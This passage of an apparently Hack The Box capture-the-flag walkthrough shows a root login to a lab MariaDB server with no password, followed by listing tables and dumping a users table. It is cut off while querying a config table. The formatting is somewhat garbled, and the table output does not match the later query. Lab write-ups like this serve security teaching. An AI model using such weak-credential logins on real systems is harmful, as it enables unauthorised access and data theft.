Now we now that the machine is running a MariaDB server. We are going to use the `mysql` client to connect to the server. (Assuming that the server has weak credentials)

```bash
mysql -h 10.129.95.232 -u root

We want to use the htb database.

```bash
mysql> use htb;
```

```bash
Database changed
```

```bash
mysql> SHOW TABLES;
```

```bash
+---------------+

| users         |                         
+---------------+ 
```

Let's see the content of the `users` table.

```bash
mysql> SELECT * FROM users;
```

```bash
mysql> select * from users;
+----+----------+------------------+
| id | username | email            |

|  4 | mary     | mary@sequel.htb  |
+----+----------+------------------+
```

Nothing interesting here. Let's see the content of the `config` table.

```bash
mysql> SELECT * FROM config;
```

```bash
